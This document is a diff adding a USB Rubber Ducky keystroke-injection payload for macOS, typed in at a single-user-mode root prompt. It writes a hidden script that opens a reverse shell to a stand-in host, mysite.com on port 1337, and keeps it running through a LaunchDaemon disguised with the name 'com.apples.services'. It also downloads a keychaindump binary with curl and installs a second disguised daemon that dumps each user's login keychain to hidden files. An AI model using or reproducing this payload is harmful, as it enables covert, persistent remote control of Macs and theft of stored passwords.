@@ -1,0 +1,140 @@
+REM BadCoFN
+REM OSX root shell and Keychain dump
+REM Boot mac into single user mode with Command+S then insert USBRubberDucky at root#
+REM
+REM Uses slightly Modified scripts from Patrick Mosca and Isaiah Turner
+REM
+REM Patrick Mosca Script starts here
+REM A simple script for rooting OSX from single user mode.
+REM Change mysite.com to your domain name or IP address
+REM Change 1337 to your port number
+REM Catch the shell with 'nc -l -p 1337'
+REM http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
+DELAY 1000
+STRING mount -uw /
+ENTER
+DELAY 2000
+STRING mkdir /Library/.hidden
+ENTER
+DELAY 200
+STRING echo '#!/bin/bash
+ENTER
+STRING bash -i >& /dev/tcp/mysite.com/1337 0>&1
+ENTER
+STRING wait' > /Library/.hidden/connect.sh
+ENTER
+DELAY 500
+STRING chmod +x /Library/.hidden/connect.sh
+ENTER
+DELAY 200
+STRING mkdir /Library/LaunchDaemons
+ENTER
+DELAY 200
+STRING echo '<plist version="1.0">
+ENTER
+STRING <dict>
+ENTER
+STRING <key>Label</key>
+ENTER
+STRING <string>com.apples.services</string>
+ENTER
+STRING <key>ProgramArguments</key>
+ENTER
+STRING <array>
+ENTER
+STRING <string>/bin/sh</string>
+ENTER
+STRING <string>/Library/.hidden/connect.sh</string>
+ENTER
+STRING </array>
+ENTER
+STRING <key>RunAtLoad</key>
+ENTER
+STRING <true/>
+ENTER
+STRING <key>StartInterval</key>
+ENTER
+STRING <integer>60</integer>
+ENTER
+STRING <key>AbandonProcessGroup</key>
+ENTER
+STRING <true/>
+ENTER
+STRING </dict>
+ENTER
+STRING </plist>' > /Library/LaunchDaemons/com.apples.services.plist
+ENTER
+DELAY 500
+STRING chmod 600 /Library/LaunchDaemons/com.apples.services.plist
+ENTER
+DELAY 200
+STRING launchctl load /Library/LaunchDaemons/com.apples.services.plist
+ENTER
+DELAY 1000
+REM
+REM Isaiah Turner Keychain dump script starts here - 
+REM http://isaiahjturner.com
+REM
+REM you may want to download and compile keychaindump from here https://github.com/juuso/keychaindump and host yourself
+REM
+STRING echo '#!/bin/sh
+ENTER
+STRING curl -o /Library/.hidden/keychaindump https://raw.githubusercontent.com/IsaiahJTurner/keychaindump/master/keychaindump -O --retry 999 --retry-max-time 0 -C -
+ENTER
+STRING chmod +x /Library/.hidden/keychaindump
+ENTER
+STRING w -h | sort -u -t'"' '"' -k1,1 | while read user etc
+ENTER
+STRING do
+ENTER
+STRING homedir=$(dscl . -read /Users/$user NFSHomeDirectory | cut -d'"' '"' -f2)
+ENTER
+STRING /Library/.hidden/keychaindump $homedir/Library/Keychains/login.keychain > /Library/.hidden/$user.login.keychain.txt
+ENTER
+STRING done' > /Library/.hidden/dump.sh
+ENTER
+DELAY 500
+STRING chmod +x /Library/.hidden/dump.sh
+ENTER
+DELAY 200
+STRING mkdir /Library/LaunchDaemons
+ENTER
+DELAY 200
+STRING echo '<plist version="1.0">
+ENTER
+STRING <dict>
+ENTER
+STRING <key>Label</key>
+ENTER
+STRING <string>com.apples1.services</string>
+ENTER
+STRING <key>ProgramArguments</key>
+ENTER
+STRING <array>
+ENTER
+STRING <string>/bin/sh</string>
+ENTER
+STRING <string>/Library/.hidden/dump.sh</string>
+ENTER
+STRING </array>
+ENTER
+STRING <key>RunAtLoad</key>
+ENTER
+STRING <true/>
+ENTER
+STRING <key>AbandonProcessGroup</key>
+ENTER
+STRING <true/>
+ENTER
+STRING </dict>
+ENTER
+STRING </plist>' > /Library/LaunchDaemons/com.apples1.services.plist
+ENTER
+DELAY 500
+STRING chmod 644 /Library/LaunchDaemons/com.apples1.services.plist
+ENTER
+DELAY 200
+STRING launchctl load /Library/LaunchDaemons/com.apples1.services.plist
+ENTER
+STRING shutdown -h now
+ENTER
